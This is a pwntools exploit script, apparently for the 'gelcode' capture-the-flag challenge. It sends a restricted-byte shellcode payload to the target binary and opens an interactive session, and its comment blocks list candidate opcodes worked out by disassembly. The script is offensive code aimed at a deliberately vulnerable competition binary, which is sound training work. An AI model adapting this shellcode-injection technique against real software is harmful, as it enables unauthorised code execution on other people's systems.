from pwn import *

elf = ELF("./gelcode")

target = process([elf.path])
#target = remote("gelcode.hsc.tf", 1337)

context.log_level = "DEBUG"

#gdb.attach(target, 'b *main+250 \n c')
payload = ""
#payload += "\x0f\x05"
payload += "\x04\x01\x0f\x05" + "\x04\x01"*9
payload += "A"*(1000 - len(payload))
target.sendafter("Input, please.", payload)

target.interactive()


'''
0:  01 0f                   add    DWORD PTR [rdi],ecx
2:  00 01                   add    BYTE PTR [rcx],al
4:  02 01                   add    al,BYTE PTR [rcx]
6:  03 01                   add    eax,DWORD PTR [rcx]
8:  04 0c                   add    al,0xc
a:  08 01                   or     BYTE PTR [rcx],al
c:  09 01                   or     DWORD PTR [rcx],eax
e:  0a 01                   or     al,BYTE PTR [rcx]
10: 0b 01                   or     eax,DWORD PTR [rcx]
12: 0c 0c                   or     al,0xc
14: 0f                      .byte 0xf
15: 01                      .byte 0x1
'''

'''
0:  ff e6                   jmp    rsi
2:  ff d6                   call   rsi
4:  48 c1 ea 04             shr    rdx,0x4
8:  ff d2                   call   rdx
a:  ff e2                   jmp    rdx
c:  48 87 d6                xchg   rsi,rdx
f:  31 c0                   xor    eax,eax
11: 48 31 c0                xor    rax,rax
14: 29 c0                   sub    eax,eax
16: 50                      push   rax
17: 68 00 00 10 00          push   0x100000
1c: 01 c6                   add    esi,eax
1e: 41 53                   push   r11
20: ff c2                   inc    edx
22: 4c 89 ce                mov    rsi,r9
25: 54                      push   rsp
26: 5e                      pop    rsi
'''